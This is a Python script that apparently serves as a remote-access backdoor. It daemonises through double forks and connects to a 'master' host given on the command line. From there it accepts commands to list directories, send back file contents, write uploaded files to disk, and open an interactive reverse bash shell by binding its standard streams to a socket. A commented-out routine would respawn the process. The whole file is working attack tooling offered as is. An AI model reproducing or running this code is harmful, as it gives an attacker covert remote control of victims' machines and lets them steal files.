#!/bin/usr/python3

import os
import sys
import socket
import time
import subprocess

def get_mod_args():
    argVector = ["master_hostname", "master_port"]
    argCount = len(argVector) + 1
    return argCount, argVector

def get_args():
    master_hostname = sys.argv[1]
    master_port = int(sys.argv[2])
    return master_hostname, master_port

def invalid_args_errMsg(argVector):
    args = ""
    for arg in argVector:
        args += " <" + arg + ">"
    errMsg = "Usage ./" + sys.argv[0] + args
    return errMsg

def check_args(argCount, argVector):
    if len(sys.argv) != argCount:
        errMsg = invalid_args_errMsg(argVector)
        sys.stderr.write(errMsg)
        return 1
    else:
        return 0

def get_configs():
    argCount, argVector = get_mod_args()
    if check_args(argCount, argVector) == 0:
        master_hostname, master_port = get_args()
    return master_hostname, master_port

# def reborn(master_hostname, master_port):
#     pid = os.fork()
#     if pid == 0:
#         pid2 = os.fork()
#         if pid2 == 0:
#             master_port += 1
#             syscmd = "python3 %s %s %d" % (sys.argv[0], master_hostname, master_port)
#             os.system(syscmd)
#         else:
#             sys.exit(0)
#     else:
#         sys.exit(0)

def reverse_shell(master_hostname, master_port, shell_port):
    pid = os.fork()
    if pid == 0:
        pid2 = os.fork()
        if pid2 == 0:
            shellSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shellSocket.connect((master_hostname, shell_port)) 
            os.dup2(shellSocket.fileno(),0) 
            os.dup2(shellSocket.fileno(),1) 
            os.dup2(shellSocket.fileno(),2) 
            subprocess.run(["/bin/bash","-i"])
            # reborn(master_hostname, master_port)
    sys.exit(0)

def cmd_shell(objSocket, master_hostname, master_port):
    while True:
        try:
            encoded_cmd = objSocket.recv(1024)
        except socket.error:
            # error connecting to master to recv data
            sys.exit(0)

        cmd = encoded_cmd.decode()
        # remove newline from the end
        res = ""
        pl = False
        if cmd[:2] == "ls":
            res = ""
            resp_list = os.listdir()
            for resp in resp_list:
                res += resp + 4*" "
        elif cmd[:3] == "pwd":
            res = str(os.getcwd())
        elif cmd[:2] == "dl":
            #cmd_example = "dl note.txt" so cmd_example[2] == " "
            filepath = cmd[3:]
            fp = open(filepath, "r")
            data = fp.read()
            fp.close()
            res = str(data)
        elif cmd[:2] == "pl":
            pl = True

        elif cmd[:5] == "shell":
            shell_port = int(cmd[5:])
            time.sleep(1)
            reverse_shell(master_hostname, master_port, shell_port)
        else:
            res = "404could not find command"
        try:
            res = "ACK" + res
            objSocket.send(res.encode())
        except socket.error:
            # error sending data to master
            sys.exit(0)
        
        if pl == True:
            filename = "master_dl"
            encoded_data = objSocket.recv(64000)
            data = encoded_data.decode()
            with open(filename, "w") as fp:
                fp.write(data)

def bootstrap(master_hostname, master_port):
    try:
        objSocket = socket.socket()
    except socket.error:
        # error creating socket
        sys.exit(0)

    objSocket.connect((master_hostname, master_port))

    cmd_shell(objSocket, master_hostname, master_port)


def main():
    master_hostname, master_port = get_configs()
    
    pid = os.fork()
    if pid == 0:
        pid2 = os.fork()
        if pid2 == 0:
            bootstrap(master_hostname, master_port)
    sys.exit(0)

if __name__ == "__main__":
    main()